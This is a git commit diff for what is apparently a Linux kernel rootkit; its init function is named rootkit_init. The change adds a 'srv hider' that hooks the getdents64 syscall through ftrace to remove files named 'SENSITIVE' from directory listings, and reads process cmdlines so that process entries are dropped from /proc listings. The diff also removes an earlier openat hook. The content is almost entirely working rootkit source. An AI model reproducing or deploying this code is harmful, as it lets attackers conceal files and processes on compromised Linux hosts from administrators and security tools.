d3551a762e01955344e38fb5bdcbd9605eda95c2
flashnuke <adanikel@gmail.com>
2025-03-14 19:20:46 -0400

    add srv hider

--- getdents_hook.h
+++ getdents_hook.h
@@ -3,82 +3,157 @@
 // TODO go over code, refine it, remove includes, etc...
 
 #include <linux/linkage.h>
-#include <linux/init.h>
-
+#include <linux/mm.h>           // for mm_struct, get_task_mm(), mmput()
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
 #include <linux/kprobes.h>
-#include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/ftrace.h>
 #include <asm/unistd.h>
 
-#include "helpers.h" // todo add include protection in header
-#include "getdents_hook.h"
+#include "helpers.h" // todo: add include protection in header
+// Removed: #include "getdents_hook.h"
 
+// (Place your inline functions and static functions here)
+static inline bool is_numeric(const char *str)
+{
+    int i;
+    if (!str || !str[0])
+        return false;
+    for (i = 0; str[i] != '\0'; i++) {
+        if (str[i] < '0' || str[i] > '9')
+            return false;
+    }
+    return true;
+}
+
+static char *read_cmdline_from_task(pid_t pid, size_t *out_size)
+{
+    struct task_struct *task;
+    struct mm_struct *mm;
+    char *buffer;
+    size_t size;
+    ssize_t nread;
+
+    /* Locate the target process */
+    rcu_read_lock();
+    task = pid_task(find_vpid(pid), PIDTYPE_PID);
+    if (!task) {
+        rcu_read_unlock();
+        return NULL;
+    }
+    mm = get_task_mm(task);
+    rcu_read_unlock();
+    if (!mm)
+        return NULL;
+
+    /* Lock the mm using mmap_lock (replacing deprecated mmap_sem) */
+    down_read(&mm->mmap_lock);
+    size = mm->arg_end - mm->arg_start;
+    up_read(&mm->mmap_lock);
+
+    /* Allocate a buffer (extra byte for null termination) */
+    buffer = kmalloc(size + 1, GFP_KERNEL);
+    if (!buffer) {
+        mmput(mm);
+        return NULL;
+    }
+
+    /* Read the process's cmdline from memory */
+    nread = access_process_vm(task, mm->arg_start, buffer, size, 0);
+    mmput(mm);
+    if (nread < 0 || nread != size) {
+        kfree(buffer);
+        return NULL;
+    }
+    buffer[size] = '\0';
+    if (out_size)
+        *out_size = size;
+    return buffer;
+}
 
 static asmlinkage long (*orig_getdents)(const struct pt_regs*);
 
-asmlinkage int hook_getdents(const struct pt_regs* regs) {
-        long ret; // will represent the amount of bytes to process, set by the getdents call
-        unsigned long offset = 0;
-        unsigned long bytes_left;
-        struct linux_dirent64 *d, *kdirent, *kdirent_orig; // kdirent_orig is in case something fails
-        char *dirp = (char *)regs->si; // will hold the results of the getdents call
-        ret = orig_getdents(regs);
+asmlinkage int hook_getdents(const struct pt_regs* regs)
+{
+    long ret; // total bytes returned by getdents
+    unsigned long offset = 0;
+    unsigned long bytes_left;
+    struct linux_dirent64 *d, *kdirent, *kdirent_orig;
+    char *dirp = (char *)regs->si;
+    ret = orig_getdents(regs);
 
-        long orig_ret = ret; // in case something fails
-        if (ret <= 0) {
-                return ret;
-        }
+    long orig_ret = ret;
+    if (ret <= 0)
+        return ret;
 
-        kdirent = kmalloc(ret, GFP_KERNEL); // allocate memory on kernel
-        if (!kdirent) {
-                return ret;
-        }
+    kdirent = kmalloc(ret, GFP_KERNEL);
+    if (!kdirent)
+        return ret;
 
-        kdirent_orig = kmalloc(ret, GFP_KERNEL);  // CHANGED: new backup allocation
-        if (!kdirent_orig) {
-                kfree(kdirent);
-                return ret;
-        }
+    kdirent_orig = kmalloc(ret, GFP_KERNEL);
+    if (!kdirent_orig) {
+        kfree(kdirent);
+        return ret;
+    }
 
+    if (copy_from_user(kdirent, dirp, ret)) {
+        kfree(kdirent);
+        kfree(kdirent_orig);
+        return ret;
+    }
+    memcpy(kdirent_orig, kdirent, ret);
 
-        if (copy_from_user(kdirent, dirp, ret)) { // copy original results into the kernel buffer
-                kfree(kdirent);
-                kfree(kdirent_orig);
-                return ret;
-        }
-        memcpy(kdirent_orig, kdirent, ret);
-
-        bytes_left = ret; 
-        while (bytes_left > 0) {
-                d = (struct linux_dirent64 *)((char *)kdirent + offset); // get next entry
-                if (strstr(d->d_name, "SENSITIVE")) {
-                        size_t tmp = d->d_reclen; // store as tmp otherwise it will be overwritten by next entry after memmove
-                        memmove(d, (char *)d + tmp, bytes_left - tmp); // move next entries backwards to overwrite the hidden entry
-                        ret -= tmp; // reduce bytes to read (to return)
-                        bytes_left -= tmp; // reduce bytes to read in this loop
-                        continue; // do no update offset, as next iteration will use the same offset where the new memory was placed
+    bytes_left = ret;
+    while (bytes_left > 0) {
+        d = (struct linux_dirent64 *)((char *)kdirent + offset);
+        size_t tmp = d->d_reclen;
+        if (strstr(d->d_name, "SENSITIVE")) {
+            memmove(d, (char *)d + tmp, bytes_left - tmp);
+            ret -= tmp;
+            bytes_left -= tmp;
+            continue;
+        } else if (is_numeric(d->d_name)) {
+            int pid;
+            if (kstrtoint(d->d_name, 10, &pid) == 0) {
+                char *cmdline;
+                size_t cmd_size;
+                cmdline = read_cmdline_from_task(pid, &cmd_size);
+                if (cmdline) {
+                    size_t i;
+                    for (i = 0; i < cmd_size; i++) {
+                        if (cmdline[i] == '\0')
+                            cmdline[i] = ' ';
+                    }
+                    if (strstr(cmdline, "SENSITIVE"))
+                        pr_info("detected %s", cmdline);
+                    kfree(cmdline);
+                    memmove(d, (char *)d + tmp, bytes_left - tmp);
+                    ret -= tmp;
+                    bytes_left -= tmp;
+                    continue;
+                    
                 }
-
-                offset += d->d_reclen;
-                bytes_left -= d->d_reclen;
-
+            }
         }
+        offset += d->d_reclen;
+        bytes_left -= d->d_reclen;
+        pr_info("hello from %s\n", d->d_name);
+    }
 
-        if (copy_to_user(dirp, kdirent, ret)) { // copy the filtered result + new 'ret' val into user space
-                copy_to_user(dirp, kdirent_orig, ret); // restore original if copying modified fails
-                kfree(kdirent_orig);
-                kfree(kdirent);
-                return ret;
-        }
-
+    if (copy_to_user(dirp, kdirent, ret)) {
+        copy_to_user(dirp, kdirent_orig, ret);
         kfree(kdirent_orig);
         kfree(kdirent);
-        return ret; // return new size
+        return ret;
+    }
+
+    kfree(kdirent_orig);
+    kfree(kdirent);
+    return ret;
 }
 
 #endif // GETDENTS_HOOK_H
+
--- kprobe_inject.c
+++ kprobe_inject.c
@@ -1,56 +1,31 @@
 // TODO go over code, refine it, remove includes, etc...
 
-#include <linux/linkage.h>
+#include <linux/module.h>
 #include <linux/init.h>
 
+#include <linux/kernel.h>
+#include <linux/file.h>     // For file operations
+#include <linux/mm.h>           // for mm_struct, get_task_mm(), mmput()
+
+//#include <linux/linkage.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
 #include <linux/kprobes.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
 #include <linux/ftrace.h>
 #include <asm/unistd.h>
 
 #include "helpers.h" // todo add include protection in header
-#include "getdents_hook.h"
 #include "kill_hook.h"
 
 
 #include <linux/fs.h>      // for struct file and struct dir_context
 
-#include "proc_finder.h"
+#include "getdents_hook.h"
+//#include "proc_finder.h"
 
 
-// Pointer to the original openat syscall.
-static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
-
-// Our hook for openat.
-asmlinkage long hook_openat(const struct pt_regs *regs)
-{
-    const char __user *filename_user = (const char __user *)regs->si; // TODO filename_user?
-    char filename[256] = {0};
-    long ret;
-
-    /* Try to copy the filename from user space.
-     * strncpy_from_user returns the number of bytes copied, or a negative error.
-     */
-    if (strncpy_from_user(filename, filename_user, sizeof(filename)) > 0) {
-        // Check if the filename starts with "/proc/"
-        if (strncmp(filename, "/proc/", 6) == 0) {
-            pr_info("Hello world from openat hook: %s\n", filename);
-	    char* pid_str = extract_pid_from_proc_path((char*)filename);
-	    if (pid_str != NULL && pid_str[0] != '\0') {
-	    	bool relevant = check_cmdline_contains_sensitive(pid_str);
-	        pr_info("%s\n", pid_str);
-		pr_info("is relvant %d", relevant);
-	    }
-        }
-    }
-    ret = orig_openat(regs);
-    return ret;
-}
 
 
 
@@ -59,7 +34,6 @@ asmlinkage long hook_openat(const struct pt_regs *regs)
 static struct ftrace_hook hooks[] = {
  //   HOOK("__x64_sys_kill", hook_kill, &orig_kill),
         HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
-	    HOOK("__x64_sys_openat", hook_openat, &orig_openat)
 };
 
 static int __init rootkit_init(void) {
